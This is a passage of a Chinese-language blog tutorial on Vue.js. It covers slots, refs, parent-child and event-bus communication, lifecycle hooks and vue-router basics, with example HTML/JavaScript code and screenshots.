src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220094237.png" alt="image-20211220094236130"></p><p>全局创建一个尾部</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220094408.png" alt="image-20211220094407041"></p><h2 id="slot插槽和ref、-parent"><a href="#slot插槽和ref、-parent" class="headerlink" title="slot插槽和ref、$parent"></a>slot插槽和ref、$parent</h2><p>设计可扩展组件及获取子组件和父组件实例</p><ul><li>slot插槽</li></ul><p>slot就是子组件里给DOM留下的坑位<br>&lt;子组件&gt;DOM&lt;/子组件&gt;<br>slot是动态的DOM</p><ul><li>ref获取子组件实例</li></ul><p>识别：在子组件或元素上使用属性ref=”xxxx”<br>获取：this.$refs.xxxx 获取元素<br>$el 是拿其DOM</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$parent获取父组件实例（可在子组件直接使用this.$parent即可）</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220095848.png" alt="image-20211220095846805"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220100018.png" alt="image-20211220100016718"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220100038.png" alt="image-20211220100037782"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220100206.png" alt="image-20211220100205308"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220100234.png" alt="image-20211220100233572"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220100223.png" alt="image-20211220100221840"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220100335.png" alt="image-20211220100334074"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220100358.png" alt="image-20211220100357320"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220100853.png" alt="image-20211220100852624"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220101055.png" alt="image-20211220101053735"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220100815.png" alt="image-20211220100813591"></p><p>下面这两个都是生命周期钩子函数</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220101338.png" alt="image-20211220101337290"></p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211220101258850.png" alt="image-20211220101258850"></p><p>获取父组件</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220101430.png" alt="image-20211220101428982"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220101502.png" alt="image-20211220101501422"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220101555.png" alt="image-20211220101535302"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220101622.png" alt="image-20211220101621811"></p><h2 id="父子组件的通信"><a href="#父子组件的通信" class="headerlink" title="父子组件的通信"></a>父子组件的通信</h2><p><strong>父传子</strong></p><ul><li>父传子的时候通过属性传递</li><li>子要声明props:[‘属性名’] 来接收</li><li>收到就是自己的了，随便你用<ul><li>在template中 直接用</li><li>在js中 this.属性名 用</li></ul></li></ul><p><strong>子传父</strong></p><ul><li><p>子组件里通过$emit(‘自定义事件名’,变量1，变量2)触发</p></li><li><p>父组件@自定义事件名=‘事件名’监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">子组件方法里  this.$emit(&#39;sendfather&#39;,val1,val2)触发自定义事件</span><br><span class="line">父组件里  &lt;child @sendfather&#x3D;&#39;mymethods&#39;&gt;&lt;&#x2F;child&gt;</span><br></pre></td></tr></table></figure></li></ul><p><strong>父传子</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220102236.png" alt="image-20211220102235432"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220102351.png" alt="image-20211220102349788"></p><p><strong>子传父</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220102636.png" alt="image-20211220102635225"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220103016.png" alt="image-20211220103008383"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220102903.png" alt="image-20211220102902736"></p><p>按钮一点出现了</p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211220102909377.png" alt="image-20211220102909377"></p><h2 id="非父子组件之间的通信"><a href="#非父子组件之间的通信" class="headerlink" title="非父子组件之间的通信"></a>非父子组件之间的通信</h2><p>创建一个空实例（bus中央事件总线也可以叫中间组件）</p><p>利用<code>$emit $on</code>的触发和监听事件实现非父子组件的通信</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype.$bus&#x3D;new Vue()&#x2F;&#x2F;在vue上面挂载一个$bus作为中央处理组件</span><br><span class="line">this.$bus.$emit(&#39;自定义事件名&#39;,&#39;传递的数据&#39;)&#x2F;&#x2F;触发自定义事件传递数据</span><br><span class="line">this.$bus.$on(&#39;自定义事件名&#39;，fn)&#x2F;&#x2F;监听自定义事件获取数据</span><br></pre></td></tr></table></figure><p>解决的方案还有vuex、provide/inject是解决同根往下派发、本地存储也可以进行非父子组件之间的通信</p><p>例子：底部传给头部信息</p><p>声明：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220103313.png" alt="image-20211220103311708"></p><p>注册，使用：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220103403.png" alt="image-20211220103401664"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220103627.png" alt="image-20211220103626157"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220103732.png" alt="image-20211220103731134"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220104007.png" alt="image-20211220104006124"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">"app"</span>&gt;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script type="text/</span>javascript<span class="string">" src="</span>vue.js<span class="string">"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script type="</span>text/javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        Vue.prototype.$bus = new Vue()</span></span><br><span class="line"><span class="string">        var MyHeader=&#123;</span></span><br><span class="line"><span class="string">            template:</span></span><br><span class="line"><span class="string">            `&lt;div&gt;</span></span><br><span class="line"><span class="string">            我是头部&#123;&#123;headermsg&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;`,</span></span><br><span class="line"><span class="string">            data()&#123;</span></span><br><span class="line"><span class="string">                return&#123;</span></span><br><span class="line"><span class="string">                    headermsg:'我是头部的信息'</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;,</span></span><br><span class="line"><span class="string">            created()&#123;</span></span><br><span class="line"><span class="string">                var self = this</span></span><br><span class="line"><span class="string">                //this是MyHeader这个实例</span></span><br><span class="line"><span class="string">                this.$bus.$on('sending',function(val)&#123;</span></span><br><span class="line"><span class="string">                    //这个this是$bus这个空实例的this，所以不能直接这样写</span></span><br><span class="line"><span class="string">                    //this.headermsg = val;</span></span><br><span class="line"><span class="string">                    //self.headermsg = val;</span></span><br><span class="line"><span class="string">                    this.$bus.$on('sending',val=&gt;&#123;</span></span><br><span class="line"><span class="string">                        this.headermsg = val;</span></span><br><span class="line"><span class="string">                    &#125;)</span></span><br><span class="line"><span class="string">                &#125;)</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        var MyBody=&#123;</span></span><br><span class="line"><span class="string">            template:`&lt;div&gt;我是身体&lt;/div&gt;`,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        var MyFooter=&#123;</span></span><br><span class="line"><span class="string">            template:`&lt;div&gt;我是底部&lt;button @click='sendhead'&gt;我要跟头部通信&lt;/button&gt;&lt;/div&gt;`,</span></span><br><span class="line"><span class="string">            methods:&#123;</span></span><br><span class="line"><span class="string">                sendhead()&#123;</span></span><br><span class="line"><span class="string">                    this.$bus.$emit('sending','我是底部的数据')</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        new Vue(&#123;</span></span><br><span class="line"><span class="string">            el:'#app',</span></span><br><span class="line"><span class="string">            template:`</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">                &lt;my-header&gt;&lt;/my-header&gt;&lt;hr&gt;</span></span><br><span class="line"><span class="string">                &lt;my-body&gt;&lt;/my-body&gt;&lt;hr&gt;</span></span><br><span class="line"><span class="string">                &lt;my-footer&gt;&lt;/my-footer&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            `,</span></span><br><span class="line"><span class="string">            components:&#123;</span></span><br><span class="line"><span class="string">                MyHeader,</span></span><br><span class="line"><span class="string">                MyBody,</span></span><br><span class="line"><span class="string">                MyFooter</span></span><br><span class="line"><span class="string">            &#125;,</span></span><br><span class="line"><span class="string">            data()&#123;</span></span><br><span class="line"><span class="string">                return&#123;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>点击按钮之后</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220110121.png" alt="image-20211220110119987"></p><h2 id="vue的生命周期"><a href="#vue的生命周期" class="headerlink" title="vue的生命周期"></a>vue的生命周期</h2><p>vue所有的生命周期钩子函数的作用</p><ul><li><p>需要频繁的创建和销毁组件</p><p>比如页面中部分内容显示与隐藏，但是用的是v-if</p></li><li><p>组件缓存</p><p>内置组件中</p><p>被其包裹的组件，在v-if=false的时候，不会销毁，而是停用</p><p>v-if=”true” 不会创建,而是激活</p><p>避免频繁创建组件对象的性能损耗</p><p>组件的激活和停用</p><ul><li>activated 和 deactivated</li></ul></li><li><p>成对比较</p><p>created 和 beforeCreate</p><ul><li>A 可以操作数据 B 数据没有初始化</li></ul><p>mounted 和 beforeMount</p><ul><li>A 可以操作DOM B 还未生成DOM</li></ul><p>updated 和 beforeUpdate</p><ul><li>A 可以获取最终数据 B 可以二次修改</li></ul><p>destroyed 和 beforeDestroy</p><ul><li>性能调优：频繁销毁创建的组件使用内置组件包裹</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220113519.png" alt="image-20211220113517613"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220113549.png" alt="image-20211220113547092"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220113746.png" alt="image-20211220113745212"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220113836.png" alt="image-20211220113835777"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220115052.png" alt="image-20211220115051702"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220114241.png" alt="image-20211220114240622"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220114338.png" alt="image-20211220114336155"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220114210.png" alt="image-20211220114208929"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220115606.png" alt="image-20211220115604155"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220115537.png" alt="image-20211220115535748"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220115348.png" alt="image-20211220115346828"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220115405.png" alt="image-20211220115403734"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220115640.png" alt="image-20211220115638439"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220115921.png" alt="image-20211220115920428"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220120046.png" alt="image-20211220120045037"></p><h1 id="Vue核心插件之路由模块"><a href="#Vue核心插件之路由模块" class="headerlink" title="Vue核心插件之路由模块"></a>Vue核心插件之路由模块</h1><h2 id="路由的跳转原理（哈希模式）"><a href="#路由的跳转原理（哈希模式）" class="headerlink" title="路由的跳转原理（哈希模式）"></a>路由的跳转原理（哈希模式）</h2><p>单页应用的路由模式有两种</p><ul><li>哈希模式（利用<code>hashchange</code> 事件监听 url的hash 的改变）</li><li>history模式（使用此模式需要后台配合把接口都打到我们打包后的index.html上）</li></ul><p>哈希模式原理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'hashchange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>核心是锚点值的改变，我们监听到锚点值改变了就去局部改变页面数据，不做跳转。跟传统开发模式url改变后 立刻发起请求，响应整个页面，渲染整个页面比路由的跳转用户体验更好</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220123422.png" alt="image-20211220123420506"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220123542.png" alt="image-20211220123540028"></p><h2 id="安装和使用路由"><a href="#安装和使用路由" class="headerlink" title="安装和使用路由"></a>安装和使用路由</h2><p>路由是以插件的形式引入到我们的vue项目中来的</p><p>vue-router是vue的核心插件<br>1:下载 npm i vue-router -S<br>2:安装插件Vue.use(VueRouter);<br>3:创建路由对象 var router = new VueRouter();<br>4:配置路由规则 router.addRoutes([路由对象]);<br>路由对象{path:’锚点值’,component:要(填坑)显示的组件}<br>5:将配置好的路由对象交给Vue<br>在options中传递-&gt; key叫做 router<br>6:留坑(使用组件) <router-view></router-view></p><p><strong>查看源码可以发现vue-router.js返回了VueRouter</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220125800.png" alt="image-20211220125758689"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 坑位 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入路由插件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vue-router.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Login=&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">            template:`<span class="tag">&lt;<span class="name">div</span>&gt;</span>我是登录页面<span class="tag">&lt;/<span class="name">div</span>&gt;</span>`,</span></span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="comment">// 安装路由插件</span></span></span><br><span class="line">        Vue.use(VueRouter);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">//创建路由对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> router = <span class="keyword">new</span> VueRouter(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//配置路由</span></span></span><br><span class="line">            routes:[</span><br><span class="line"><span class="actionscript">                &#123;path:<span class="string">'/login'</span>,name:<span class="string">'login'</span>,component:Login&#125;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="actionscript">        <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el:<span class="string">'#app'</span>,</span></span><br><span class="line">            router,</span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`,</span></span></span><br><span class="line">            data()&#123;</span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span>&#123;&#125;</span></span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220132236.png" alt="image-20211220132234753"></p><h2 id="路由的跳转"><a href="#路由的跳转" class="headerlink" title="路由的跳转"></a>路由的跳转</h2><p><strong>路由的跳转方式有：</strong><br>通过标签：<router-link to='/login'></router-link><br>通过js控制跳转this.$router.push({path:’/login’})</p><p><strong>区别：</strong><br>this.$router.push() 跳转到指定的url，会向history插入新记录<br>this.$router.replace() 同样是跳转到指定的url，但是这个方法不会向history里面添加新的记录，点击返回，会跳转到上上一个页面。上一个记录是不存在的。<br>this.$router.go(-1) 常用来做返回，读history里面的记录后退一个<br>vue-router中的对象：<br>$route 路由信息对象,只读对象<br>$router 路由操作对象,只写对象</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 坑位 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入路由插件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vue-router.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Login=&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">            template:`<span class="tag">&lt;<span class="name">div</span>&gt;</span>我是登录页面<span class="tag">&lt;/<span class="name">div</span>&gt;</span>`,</span></span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Register=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是注册页面<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Buy=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>我要买东西<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="comment">// 安装路由插件</span></span></span><br><span class="line">        Vue.use(VueRouter);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">//创建路由对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> router = <span class="keyword">new</span> VueRouter(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//配置路由</span></span></span><br><span class="line">            routes:[</span><br><span class="line"><span class="actionscript">                &#123;path:<span class="string">'/login'</span>,name:<span class="string">'login'</span>,component:Login&#125;,</span></span><br><span class="line"><span class="actionscript">                &#123;path:<span class="string">'/register'</span>,name:<span class="string">'register'</span>,component:Register&#125;,</span></span><br><span class="line"><span class="actionscript">                &#123;path:<span class="string">'/buy'</span>,name:<span class="string">'buy'</span>,component:Buy&#125;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="actionscript">        <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el:<span class="string">'#app'</span>,</span></span><br><span class="line">            router,</span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">'/login'</span>&gt;</span>去登录<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line">                    |</span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">'/register'</span>&gt;</span>去注册<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span 